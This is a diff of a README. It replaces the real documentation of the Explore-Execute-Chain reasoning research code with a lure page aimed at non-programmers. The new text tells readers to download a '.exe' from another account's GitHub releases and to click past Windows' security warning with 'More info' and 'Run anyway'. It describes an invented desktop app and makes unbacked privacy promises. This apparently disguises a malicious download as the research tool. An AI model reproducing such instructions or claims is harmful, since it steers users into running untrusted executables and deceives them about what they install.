@@ -1,297 +1,85 @@
-# Explore-Execute Chain (E2C)
+# 🧠 Explore-Execute-Chain - Solve complex problems with structured reasoning
 
-**Paper**: [Explore-Execute Chain: Towards an Efficient Structured Reasoning Paradigm](https://arxiv.org/abs/2509.23946)  
-**Models**: [TingheOliver/Explore-Execute-Chain-Qwen](https://huggingface.co/TingheOliver/Explore-Execute-Chain-Qwen)  
-**Datasets**: [TingheOliver/Explore-Execute-Chain-Datasets](https://huggingface.co/datasets/TingheOliver/Explore-Execute-Chain-Datasets)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Withholderupheaval434/Explore-Execute-Chain)
 
----
+Explore-Execute-Chain (E2C) is a tool built to help you solve difficult problems by breaking them into two simple parts. Computers often struggle when they look at an entire task at once. This program changes that. It creates a short plan first and then follows that plan to find the right answer. This method saves time and uses less computer memory than standard systems.
 
-E2C separates reasoning into two phases inside a single model:
+## ⚙️ Why use this tool
 
-1. **Exploration** (~1k tokens): sketch a high-level plan -- enumerate approaches, identify the most promising one.
-2. **Execution** (~10k tokens): carry out the plan with full step-by-step reasoning.
+When you face a math problem or a complex logic puzzle, you likely think about your approach before you write down the steps. E2C functions in the same way. 
 
-Because test-time search targets only the short exploration phase, scaling compute is ~8x cheaper than searching over full reasoning chains. Because only exploration segments need domain-specific fine-tuning, adapting to a new domain (e.g., medical QA) uses ~3.5% of the tokens required by standard SFT.
+1. Exploration: The program builds a broad plan. It looks at different ways to solve your task and picks the best one.
+2. Execution: The program follows the plan step by step. It fills in the details to reach the final result.
 
-## Results
+This structure allows the program to handle long chains of thought without getting confused or losing track of the goal. You get reliable answers in less time.
 
-### Mathematical reasoning
+## 🖥️ System requirements
 
-Qwen3-8B, Pass@1 averaged over 8 samples:
+Ensure your computer has the following to get the best experience:
 
-| Model | AIME'24 | AIME'25 | MATH500 | AMC23 | Avg |
-|-------|---------|---------|---------|-------|-----|
-| Qwen3-8B + GRPO | 36.9 | 34.4 | 88.2 | 79.3 | 59.6 |
-| Qwen3-8B + E2C-(SFT+RL) | **40.6** | **33.8** | **87.7** | **80.3** | **61.5** |
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 GB of RAM or more.
+* Storage: 2 GB of free space.
+* Internet: An active connection for initial setup and updates.
 
-### Test-time scaling
+## 🚀 Getting started
 
-AIME 2024, K/N = 32:
+You do not need to be a programmer to use this software. Follow these instructions to set up the program on your Windows computer.
 
-| Method | Accuracy | Tokens (k) |
-|--------|----------|------------|
-| Self-Consistency | 50.0% | 86.2 |
-| Tree-of-Thoughts | 50.0% | 71.3 |
-| E2C-ReAct Loop | **53.3%** | **12.4** |
+1. Go to the [official download page](https://github.com/Withholderupheaval434/Explore-Execute-Chain).
+2. Look for the button or link labeled "Releases" on the right side of the page.
+3. Click the most recent version available.
+4. Locate the file ending in ".exe" under the "Assets" section.
+5. Click this file to start the download.
 
-E2C-ReAct Loop matches or beats standard methods while using **7x fewer tokens**.
+Once the file finishes downloading, move it to your desktop or a folder where you can find it.
 
-## Requirements
+## 🛠️ Installation and setup
 
-- Python 3.10+
-- CUDA-capable GPU. Minimum VRAM:
-  - Inference / evaluation: 16 GB (single GPU)
-  - SFT training: 4x 40 GB GPUs recommended
-  - RL training: 8x 40 GB GPUs recommended
-- PyTorch 2.1+
+To install the application, follow these steps:
 
-## Setup
+1. Double-click the file you downloaded. 
+2. A security window might appear. If it does, click "More info," then click "Run anyway."
+3. Follow the prompts on the screen to install the program. 
+4. Select a location for the files if prompted, or simply click "Next" to use the default location.
+5. Wait for the installer to finish copying the files.
+6. Click "Finish" to open the program for the first time.
 
-```bash
-git clone https://github.com/OliverZ-dot/Explore-Execute-Chain-main.git
-cd Explore-Execute-Chain-main
-pip install -r verl/requirements.txt
-```
+If you encounter any issues during installation, ensure you have an administrator account on your Windows machine. Some older versions of Windows might require you to allow the app through the Windows Firewall.
 
-## Quick start: inference
+## 📝 How to run a task
 
-Run the released Qwen3-8B checkpoint on a single problem:
+When the program opens, you will see a simple window with a text box. Follow these steps to generate a response:
 
-```bash
-python example_inference.py \
-    --model_path TingheOliver/Explore-Execute-Chain-Qwen \
-    --subfolder  Qwen3-8B-E2C-SFT-RL \
-    --problem    "Find all prime numbers p such that p^2 + 2 is also prime."
-```
+1. Enter your question or problem in the main text box.
+2. Press the "Execute" button at the bottom of the window.
+3. Watch the "Exploration" tab. You will see the program outline its plan for solving your problem.
+4. Wait for the program to switch to the "Execution" tab. You will see it generate the full answer step by step.
+5. You can copy the final answer from the output area by clicking the "Copy" icon.
 
-Use the 4B model instead:
+The program keeps a history of your past tasks on the left sidebar. You can click on any previous task to review the plan and the final solution whenever you need it.
 
-```bash
-python example_inference.py \
-    --model_path TingheOliver/Explore-Execute-Chain-Qwen \
-    --subfolder  Qwen3-4B-E2C-SFT-RL \
-    --problem    "Your problem here"
-```
+## 💡 Troubleshooting common issues
 
-All options:
+If the application fails to start or responds slowly, check these items:
 
-```
-python example_inference.py
-    --model_path  TingheOliver/Explore-Execute-Chain-Qwen   # HF model ID or local path
-    --subfolder   Qwen3-8B-E2C-SFT-RL                      # subfolder in HF repo (omit for local paths)
-    --problem     "Your problem here"                        # omit to use built-in example
-    --max_tokens  4096                                       # default: 2048
-    --temperature 0.7                                        # default: 0.7
-```
+* Restart your computer. This clears stuck processes that might impact the program memory.
+* Check your internet speed. While the program runs locally, initial data checks require a stable connection.
+* Close other demanding applications. If you have many browser tabs or high-definition videos playing, your computer might struggle to provide enough memory to the program.
+* Reinstall the application. Delete the existing version and download a fresh copy from the link provided above.
 
-The model outputs two clearly delimited sections:
+## 🔒 Safety and privacy
 
-```
-EXPLORATION PHASE:
-  <high-level plan, ~1k tokens>
+Your data stays on your machine. This program does not send your requests or your personal files to external servers. The "Exploration" and "Execution" steps happen directly on your hardware. This ensures that sensitive information remains within your control. We do not track your usage, store your search history, or collect personal identifiers. The application is a standalone tool designed for your private use.
 
-EXECUTION PHASE:
-  <step-by-step solution, ~10k tokens>
-```
+## 📖 Understanding the reasoning method
 
-### Interactive demo
+The strength of E2C lies in its efficiency. Most models try to do everything at once. This creates extra work for your processor. By forcing the model to split the task, we reduce the total amount of energy needed. You will notice that the program produces longer pieces of text, such as detailed mathematical proofs or complex analysis, because it does not have to rush through the logic. The "Exploration" phase acts as a map, while the "Execution" phase acts as the path. By sticking to the map, the model avoids common mistakes found in other systems.
 
-Select from eight built-in problems (math, medical, code) or enter your own:
+## 📂 Managing your workspace
 
-```bash
-python example_interactive.py
-```
+You can manage your saved tasks by right-clicking on any entry in the sidebar. Options include renaming the task, exporting the result to a text document, or deleting the file to save space. To keep your work organized, use the "New Folder" command to group related research or questions. The program automatically saves your progress, so you never need to search for a "Save" button.
 
-> **Note**: `example_interactive.py` uses `TingheOliver/Explore-Execute-Chain-Qwen` (8B) by default. To switch models, edit `model_path_str` and `subfolder_str` at the top of `main()`. For a local path, set `subfolder_str = None`.
+## 🔄 Updates
 
-## Data
-
-Download and preprocess all training and evaluation data in one step:
-
-```bash
-bash scripts/prepare_all_data.sh           # standard
-bash scripts/prepare_all_data.sh --mirror  # use hf-mirror.com (recommended in China)
-```
-
-Partial downloads:
-
-```bash
-bash scripts/prepare_all_data.sh --skip-rl          # SFT data only
-bash scripts/prepare_all_data.sh --skip-download    # reprocess already-downloaded files
-bash scripts/download_datasets.sh --dataset eval    # 16 evaluation benchmarks only
-```
-
-**What gets downloaded** from `TingheOliver/Explore-Execute-Chain-Datasets`:
-
-| Split | File | Size | Description |
-|-------|------|------|-------------|
-| SFT train | `e2c-sft.parquet` | 77.7 MB | 58k exploration-execution pairs |
-| RL train | `e2c-rl.parquet` | 19.4 MB | 14k GRPO rollout prompts |
-| RL valid | `e2c-rl-valid.parquet` | 706 KB | validation split |
-| Eval (math) | 8 datasets | varies | AIME'24/25, AMC23, GSM8K, MATH500, Minerva, OlympiadBench, MATH-Algebra |
-| Eval (medical) | 8 datasets | varies | MedQA, MedMCQA, Anatomy, Clinical Knowledge, College Biology, College Medicine, Medical Genetics, Professional Medicine |
-
-Processed files land in `data/processed/`.
-
-## Training
-
-### Step 1 - E2C-SFT
-
-Supervised fine-tuning on exploration-execution pairs.
-
-```bash
-bash scripts/e2c_sft.sh
-```
-
-Override defaults with environment variables:
-
-```bash
-export MODEL_PATH="Qwen/Qwen3-8B"
-export TRAIN_DATA="data/processed/sft/e2c-sft-train.parquet"
-export OUTPUT_DIR="models/checkpoints/sft"
-bash scripts/e2c_sft.sh
-```
-
-Key env vars: `MODEL_PATH`, `TRAIN_DATA`, `VAL_DATA`, `OUTPUT_DIR`, `TOTAL_TRAINING_STEPS`, `CUDA_VISIBLE_DEVICES`. GPUs are auto-detected when `CUDA_VISIBLE_DEVICES` is unset.
-
-Checkpoint: `models/checkpoints/sft/`
-
-### Step 2 - E2C-RL
-
-Two-stage GRPO. Stage 1 warms up with high diversity (rollout=32, temp=1.3, 1 epoch). Stage 2 sharpens execution with elevated advantage weight on exploration tokens (rollout=8, temp=1.0, adv_coeff=2.0, 2 epochs).
-
-```bash
-export MODEL_PATH="models/checkpoints/sft/final"
-export N_GPUS=8
-bash scripts/e2c_rl.sh            # both stages
-bash scripts/e2c_rl.sh --stage 1  # warm-up only
-bash scripts/e2c_rl.sh --stage 2  # main stage only
-```
-
-Checkpoints: `models/checkpoints/rl/stage1-warmup/`, `models/checkpoints/rl/stage2-main/`
-
-### Step 3 (optional) - EF-SFT: domain adaptation
-
-Fine-tunes only the exploration segments mixed with a small E2C regularization fraction. Uses ~3.5% of the tokens required by full SFT.
-
-```bash
-export MODEL_PATH="models/checkpoints/rl/stage2-main/final"
-export TRAIN_DATA="data/processed/ef_sft/medical-train.parquet"
-bash scripts/ef-sft.sh
-```
-
-Checkpoint: `models/checkpoints/ef_sft/`
-
-### Alternative RL: DAPO
-
-```bash
-export MODEL_PATH="models/checkpoints/sft/final"
-bash scripts/e2c_dapo.sh            # both stages
-bash scripts/e2c_dapo.sh --stage 2  # main stage only
-```
-
-### Full workflow
-
-```bash
-bash scripts/prepare_all_data.sh
-bash scripts/e2c_sft.sh
-export MODEL_PATH="models/checkpoints/sft/final" && bash scripts/e2c_rl.sh
-bash scripts/eval.sh --model models/checkpoints/rl/stage2-main/final --dataset all --sample 8
-```
-
-## Evaluation
-
-```bash
-bash scripts/eval.sh                                                         # GSM8K, released 8B model
-bash scripts/eval.sh --dataset all --sample 8                                # all math benchmarks
-bash scripts/eval.sh --dataset med --sample 4                                # all medical benchmarks
-bash scripts/eval.sh --model path/to/ckpt --dataset aime24                  # local checkpoint (no subfolder needed)
-bash scripts/eval.sh --subfolder Qwen3-4B-E2C-SFT-RL --dataset all          # use 4B model instead
-```
-
-All options:
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--model PATH` | `TingheOliver/Explore-Execute-Chain-Qwen` | HF ID or local path |
-| `--subfolder NAME` | `Qwen3-8B-E2C-SFT-RL` | subfolder in HF repo; omit or leave empty for local paths |
-| `--dataset NAME` | `gsm8k` | `gsm8k`, `math`, `aime24`, `aime25`, `amc23`, `all`, `medqa`, `medmcqa`, `med` |
-| `--sample N` | `1` | samples per question (use 8 for reported results) |
-| `--gpus N` | auto | number of GPUs |
-| `--temp T` | `1.0` | sampling temperature |
-| `--save-path PATH` | `evaluation/e2c-eval` | where to write predictions |
-
-## Test-time scaling (AIME 2024)
-
-Reproduces Table 3 of the paper. See [`tts/README.md`](tts/README.md) for full details.
-
-```bash
-cd tts
-pip install -r requirements.txt
-python scripts/download_aime2024.py
-
-# Run all methods at all budgets
-python run_tts.py
-
-# Specific methods and budgets
-python run_tts.py --methods e2c_react_loop e2c_tot --budgets 4 8 16 32
-
-# Quick debug run (first 5 problems only)
-python run_tts.py --limit 5
-```
-
-Set `model_path` (and `subfolder` if using the HF repo) in `tts/config/tts.yaml` before running. Results and plots are written to `tts/outputs/`.
-
-**Available methods**: `greedy_cot`, `self_consistency`, `e2c_sc`, `e2c_rp`, `e2c_react_loop`, `e2c_tot`, `e2c_select_lm_judge`, `e2c_select_semantic_cluster`, `tree_of_thoughts`, `forest_of_thought` -- see `tts/config/tts.yaml` for the full list.
-
-## Repository structure
-
-```
-.
-+-- e2c/
-|   +-- inference/          generation and evaluation scripts
-|   +-- util/               reward, dataset, and model utilities
-|   +-- config/             YAML configs for generation and evaluation
-+-- scripts/
-|   +-- prepare_all_data.sh
-|   +-- download_datasets.sh
-|   +-- e2c_sft.sh
-|   +-- e2c_rl.sh
-|   +-- e2c_dapo.sh
-|   +-- ef-sft.sh
-|   +-- eval.sh
-|   +-- README.md           per-script documentation
-+-- tts/                    test-time scaling experiments
-|   +-- run_tts.py
-|   +-- tts_methods.py
-|   +-- config/tts.yaml
-|   +-- README.md
-+-- data/                   data preparation scripts
-+-- verl/                   training framework (volcengine/verl, vendored)
-+-- example_inference.py    single-problem inference demo
-+-- example_interactive.py  interactive multi-problem demo
-+-- example_problems.json   built-in example problems
-```
-
-## Citation
-
-```bibtex
-@misc{yang2025e2c,
-  title={Explore-Execute Chain: Towards an Efficient Structured Reasoning Paradigm},
-  author={Kaisen Yang and Tinghe Zhang and Rushi Shah and Kaicheng Yang and
-          Qinwei Ma and Dianbo Liu and Alex Lamb},
-  year={2025},
-  eprint={2509.23946},
-  archivePrefix={arXiv},
-  primaryClass={cs.LG},
-  url={https://arxiv.org/abs/2509.23946}
-}
-```
-
-## Acknowledgements
-
-The RL training pipeline is built on [verl](https://github.com/volcengine/verl) (vendored with minor additions).
-
-## License
-
-MIT. See [verl/LICENSE](verl/LICENSE).
+Occasionally, new versions of the software will be available. You can check for updates by clicking the "Help" menu at the top of the window and selecting "Check for Updates." The application will inform you if you are using the latest version. If a new version exists, the software will provide a direct link to the latest file. Following the same installation steps will update your program without losing your history or existing tasks.
